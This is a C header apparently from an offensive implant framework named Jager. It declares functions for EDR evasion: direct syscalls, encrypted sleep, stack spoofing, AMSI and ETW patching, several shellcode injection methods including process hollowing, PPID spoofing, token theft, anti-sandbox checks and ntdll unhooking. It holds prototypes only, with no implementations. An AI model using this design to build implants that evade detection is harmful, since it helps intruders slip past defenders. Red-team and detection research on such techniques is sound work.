#ifndef JAGER_EVASION_H
#define JAGER_EVASION_H

#include <windows.h>
#include "syscalls.h"
#include "tracked_alloc.h"

#ifdef __cplusplus
extern "C" {
#endif

/* --- Syscall Engine (Hell's Gate / Halo's Gate) --- */
BOOL syscall_init(void);
BOOL syscall_resolve(DWORD func_hash, PWORD out_ssn, PVOID* out_addr);
BOOL syscall_resolve_name(const char* name, PWORD out_ssn, PVOID* out_addr);
int  syscall_get_count(void);

/* --- Sleep Encryption (Ekko / Foliage / Zilean) --- */
#define SLEEP_TECHNIQUE_BASIC   0
#define SLEEP_TECHNIQUE_EKKO    1
#define SLEEP_TECHNIQUE_FOLIAGE 2
#define SLEEP_TECHNIQUE_ZILEAN  3
#define SLEEP_TECHNIQUE_HWBP    4
#define SLEEP_TECHNIQUE_TIMER   5

BOOL sleep_encrypt(DWORD milliseconds);
BOOL sleep_encrypt_technique(DWORD milliseconds, DWORD technique);
BOOL sleep_ekko(DWORD milliseconds);
BOOL sleep_foliage(DWORD milliseconds);
BOOL sleep_zilean(DWORD milliseconds);
BOOL sleep_obfuscate_hwbp(DWORD milliseconds);
BOOL sleep_obfuscate_timer(DWORD milliseconds);
void sleep_encrypt_text(void);
void sleep_decrypt_text(void);

/* --- CFG/CET stack spoofing (TIB swap) --- */
typedef struct _STACK_SPOOF_CTX {
    PVOID saved_stack_base;
    PVOID saved_stack_limit;
    PVOID spoof_stack_base;
    PVOID spoof_stack_limit;
    DWORD donor_thread_id;
    BOOL  active;
} STACK_SPOOF_CTX;

BOOL stack_spoof_find_donor(STACK_SPOOF_CTX *ctx);
BOOL stack_spoof_apply(STACK_SPOOF_CTX *ctx);
BOOL stack_spoof_restore(STACK_SPOOF_CTX *ctx);

/* --- Tagged heap encryption (implant allocations only) --- */
void heap_encrypt_init(void);
void heap_encrypt(void);
void heap_decrypt(void);

/* --- Stack spoofing (spoof.x64.S) --- */
void spoof_init(void);
void spoof_set_fake_ret(PVOID fake_return_address);
void spoof_call(PVOID target);
void spoof_return(void);
void spoof_call_stack(void);

/* --- ETW / AMSI Bypass --- */
#ifndef BYPASS_METHOD_HWBP
#define BYPASS_METHOD_HWBP 0
#endif
#ifndef BYPASS_METHOD_PAGEGUARD
#define BYPASS_METHOD_PAGEGUARD 1
#endif
#ifndef BYPASS_METHOD_PATCH
#define BYPASS_METHOD_PATCH 2
#endif

BOOL bypass_install(void);
void bypass_remove(void);
/* DR register allocator (HWBP slot budgeting) */
void dr_init(void);
int  dr_allocate(void *target_addr, const char *purpose);
void dr_release(int slot);
int  dr_get_slot_for_purpose(const char *purpose);

extern volatile int g_amsi_bypassed;
extern volatile int g_etw_bypassed;

BOOL hwbp_install_bypass(void);
BOOL hwbp_install_hwbp_amsi(void);
BOOL hwbp_install_hwbp_etw(void);
BOOL hwbp_install_on_thread(HANDLE thread);
void hwbp_propagate_to_thread(HANDLE hThread);
void hwbp_remove_bypass(void);
HANDLE jager_create_thread(
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId);
BOOL pageguard_install_bypass(void);
void pageguard_remove_bypass(void);
BOOL patch_etw(void);
BOOL patch_amsi(void);
BOOL bypass_etw_ti(void);
BOOL bypass_etw_ti_targeted(void);
BOOL install_dll_load_monitor(void);
BOOL etw_patch(void);
BOOL etw_restore(void);
BOOL etw_patch_nttrace(void);
BOOL amsi_patch(void);
BOOL amsi_patch_init(void);
BOOL evasion_patch_all(void);
void evasion_restore_temporarily(void);
void evasion_repatch(void);

/* --- Process Injection --- */
typedef enum {
    INJECT_MODULE_STOMP = 0,
    INJECT_THREADLESS,
    INJECT_MAP_VIEW,
    INJECT_EARLY_BIRD,
    INJECT_REMOTE_THREAD,
    INJECT_HOLLOW,
    INJECT_APC
} INJECTION_METHOD;

DWORD find_injection_target(const wchar_t* process_name);
BOOL  inject_module_stomp(HANDLE hProcess, PBYTE shellcode, SIZE_T sc_size, const char* stomp_dll);
BOOL  inject_module_stomp_pid(DWORD target_pid, PBYTE shellcode, SIZE_T sc_size, const char* stomp_dll);
BOOL  inject_spawn_to(PBYTE shellcode, SIZE_T sc_size, const wchar_t* spawn_path, const char* stomp_dll);
BOOL  inject_threadless(HANDLE hProcess, PBYTE shellcode, SIZE_T sc_size);
BOOL  threadless_inject(DWORD target_pid, const BYTE *payload, DWORD payload_size,
                        const char *stomp_dll, DWORD delay_ms);
BOOL  threadless_inject_ex(DWORD target_pid, const BYTE *payload, DWORD payload_size,
                           const char *stomp_dll, DWORD delay_ms, PVOID *trigger_out);
BOOL  threadless_inject_handle(HANDLE hProcess, const BYTE *payload, DWORD payload_size,
                               const char *stomp_dll, DWORD delay_ms, PVOID *trigger_out);

typedef struct {
    HANDLE process;
    PVOID  export_addr;
    BYTE   original_bytes[5];
} THREADLESS_CLEANUP;

BOOL  threadless_inject_handle_ex(HANDLE hProcess, const BYTE *payload, DWORD payload_size,
                                  const char *stomp_dll, DWORD delay_ms,
                                  PVOID *trigger_out, THREADLESS_CLEANUP *cleanup_out);
BOOL  threadless_restore(THREADLESS_CLEANUP *cleanup);
BOOL  inject_map_view(HANDLE hProcess, PBYTE shellcode, SIZE_T sc_size);
BOOL  inject_early_bird(const wchar_t* spawn_path, PBYTE shellcode, SIZE_T sc_size);
BOOL  inject_process_hollow(const char *target_exe, BYTE *payload, DWORD payload_size,
                            DWORD parent_pid, char *out, int out_size);
BOOL  inject_process_hollow_pid(DWORD target_pid, BYTE *payload, DWORD payload_size,
                                char *out, int out_size);
BOOL  read_own_pe_file(BYTE **pe_out, DWORD *pe_size_out);
INJECTION_METHOD select_injection_method(DWORD target_pid);
BOOL  inject_shellcode(DWORD target_pid, BYTE *payload, DWORD payload_size,
                       char *out, int out_size);

/* --- PPID Spoofing --- */
DWORD find_suitable_parent_pid(void);
BOOL create_process_ppid_spoof(DWORD parent_pid, const char *target_exe,
    const char *spoofed_args, const char *real_args, BOOL suspended,
    PROCESS_INFORMATION *pi_out);
BOOL create_process_ppid_spoof_w(DWORD parent_pid, const wchar_t *target_exe,
    const wchar_t *spoofed_args, const wchar_t *real_args, BOOL suspended,
    PROCESS_INFORMATION *pi_out);
BOOL patch_peb_command_line(HANDLE hProcess, const char *exe, const char *real_args);

/* --- Return-address spoofing (syscall path) --- */
BOOL init_return_spoof(void);
BOOL return_spoof_ready(void);
BOOL setup_spoof_frame(PVOID gadget_addr, PVOID return_addr);
BOOL return_spoof_apply(void);
void return_spoof_clear(void);

/* --- Token Manipulation --- */
BOOL enable_privilege(const wchar_t* privilege_name);
BOOL steal_token(DWORD target_pid);
BOOL make_token(const wchar_t* domain, const wchar_t* user, const wchar_t* password);

/* --- Anti-Debug / Anti-Sandbox --- */
BOOL check_debugger_present(void);
BOOL check_sandbox_artifacts(void);
/* TODO: check_vm_indicators not yet implemented */
/* TODO: timing_check not yet implemented */
void anti_analysis_init(void);

/* --- DLL Unhooking (KnownDlls) --- */
BOOL unhook_module(const wchar_t *dll_name);
BOOL unhook_ntdll(void);
BOOL unhook_dll(const char* dll_name);
BOOL unhook_all_known_dlls(void);

#ifdef __cplusplus
}
#endif

#endif /* JAGER_EVASION_H */
